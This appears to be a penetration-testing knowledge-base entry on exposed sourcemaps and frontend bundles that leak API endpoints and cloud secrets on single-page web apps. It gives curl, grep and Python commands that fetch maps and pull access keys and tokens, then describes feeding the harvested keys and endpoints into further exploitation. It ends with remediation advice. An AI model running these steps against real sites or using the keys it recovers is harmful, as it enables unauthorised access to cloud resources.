---
title: sourcemaps / frontend JS disclose endpoints and secrets (the primary entry point for SPA turnkey gambling sites)
cve: None (configuration flaw)
severity: high
cvss: 8.6
product: Sites with separate frontend and backend (Vue/React/uni-app)
versions: Any
ports: 80, 443
keywords: sourcemap, js, frontend, secrets, endpoints, disclosure, spa
entry: /static/js/*.js.map and AK/secret values packaged in bundles
verified: false
sources: Compiled from public sources (configuration flaws)
---

## Fingerprints

```
GET /static/js/app.js.map      → 200 (sourcemap not removed)
GET /assets/index-xxxx.js      → 200, several hundred KB
```

## Prerequisites

- The target is an SPA; sourcemaps are not disabled and secrets have not been externalized.

## PoC

```bash
# 1) Find bundles and maps
curl -s https://target/ | grep -oE '(src|href)="[^"]+\.(js|css)"' | head -20
for f in $(curl -s https://target/ | grep -oE '/[^"]+\.js' | sort -u | head -10); do
  code=$(curl -s -o /tmp/x.js -w '%{http_code}' "https://target$f")
  echo "$f $code $(stat -c%s /tmp/x.js)"; 
  curl -s -o /dev/null -w "  map %{http_code}\n" "https://target$f.map"
done
# Confirmation: .map returns 200 = sourcemap not removed

# 2) Reconstruct source directories from the map (find the endpoint inventory)
python3 - <<'PY'
import json,requests
m=requests.get("https://target/static/js/app.js.map").json()
print(len(m.get("sources",[])), "source files")
for s in m["sources"][:20]: print(s)
PY

# 3) Search bundles for secrets and endpoints
curl -s https://target/static/js/app.js > /tmp/app.js
grep -oE '/api/[a-zA-Z0-9_/-]+' /tmp/app.js | sort -u | head -40
grep -oiE '(accessKey|secretKey|appSecret|AES_KEY|jwt|token)[^,;]{0,60}' /tmp/app.js | head -20
# Confirmation: plaintext AK/SK/secrets = direct cloud-resource access or signature forgery possible
```

## Exploitation Steps

1. First retrieve bundles and maps (read-only);
2. Recover endpoint inventories and routes from the map's `sources` (ten times faster than directory scanning);
3. Search bundles for `aliyun/oss/tencent/cos/AES/jwt secret`;
4. Verify permissions for obtained AK/SK through the `cloud-aksk-exploit` workflow; feed endpoint inventories into `api-fuzz` / `idor-methodology`;
5. Evidence: map 200 response + first few sources lines + matched secret fragment (redacted).

## Remediation and Mitigation

- Disable sourcemaps in production builds (`productionSourceMap:false` / `build.sourcemap:false`);
- Deliver secrets server-side/use short-lived STS; retain only public keys in bundles.

## References

- OWASP WSTG-INFO-05; frontend-build security configuration.
